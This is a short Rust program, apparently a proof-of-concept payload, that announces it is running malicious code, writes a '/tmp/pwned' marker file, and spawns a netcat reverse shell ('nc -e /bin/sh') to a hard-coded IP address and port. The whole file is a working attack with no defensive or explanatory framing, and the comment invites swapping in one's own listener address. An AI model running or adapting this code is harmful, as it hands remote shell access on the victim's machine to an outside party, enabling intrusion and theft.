use std::process::Command;

fn main() {
    println!("Running malicious code...");

    // Example: Write a file as a proof
    std::fs::write("/tmp/pwned", "You have been hacked!").unwrap();

    // Example: Reverse shell (replace with your IP and port)
    let _ = Command::new("sh")
        .arg("-c")
        .arg("nc -e /bin/sh 103.160.106.201 5050")
        .spawn();
}
